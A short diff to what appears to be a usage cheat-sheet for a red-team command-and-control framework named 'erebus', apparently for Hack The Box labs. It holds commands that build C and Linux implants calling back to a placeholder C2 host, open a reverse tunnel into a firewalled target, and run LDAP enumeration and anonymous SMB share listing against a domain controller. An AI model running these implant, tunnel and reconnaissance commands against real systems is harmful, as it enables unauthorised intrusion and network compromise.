@@ -12,7 +12,7 @@ make implant-c CALLBACK_URL=https://<C2>:8443 \
 make implant-c-linux CALLBACK_URL=https://<C2>:8443 \
   CA_CERT_PATH=$HOME/.erebus/ca-cert.pem SLEEP_MS=500 JITTER_PCT=10
 # Firewalled Linux HTB:
-#   ./scripts/htb_reverse_tunnel.sh user@TARGET
+#   erebus inbound tunnel user@TARGET
 #   CALLBACK_URL=https://127.0.0.1:8443 make implant-c-linux ...
 ./scripts/c_linux_e2e_smoke.sh   # host unit tests + Linux C build
 bash scripts/smoke_test.sh
@@ -39,6 +39,7 @@ bash scripts/smoke_test.sh
 ./build/erebus op approve-all
 
 # Host-side (no implant)
+./build/erebus inbound status
 ./build/erebus ldap enum --dc DC --domain DOM --user u --pass-file p --type interesting
 ./build/erebus ldap dangling --dc DC --domain DOM --user u --pass-file p
 ./build/erebus smb shares --host DC --anon
